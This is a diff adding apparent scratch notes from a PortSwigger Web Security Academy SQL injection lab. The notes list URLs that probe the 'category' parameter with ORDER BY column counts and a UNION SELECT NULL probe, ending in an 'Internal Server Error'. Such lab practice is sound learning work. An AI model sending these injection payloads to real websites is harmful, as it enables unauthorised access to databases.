@@ -1,0 +1,11 @@
+
+https://0aa300a4042e043bc053dcb8002900ae.web-security-academy.net/filter?category=Gifts
+
+https://0aa300a4042e043bc053dcb8002900ae.web-security-academy.net/filter?category=Gifts'order by 1--
+https://0aa300a4042e043bc053dcb8002900ae.web-security-academy.net/filter?category=Gifts'order by 1,2--
+https://0aa300a4042e043bc053dcb8002900ae.web-security-academy.net/filter?category=Gifts'order by 1,2,3--
+
+https://0aa300a4042e043bc053dcb8002900ae.web-security-academy.net/filter?category=Gifts'union select NULL,NULL,NULL--
+
+
+Internal Server Error
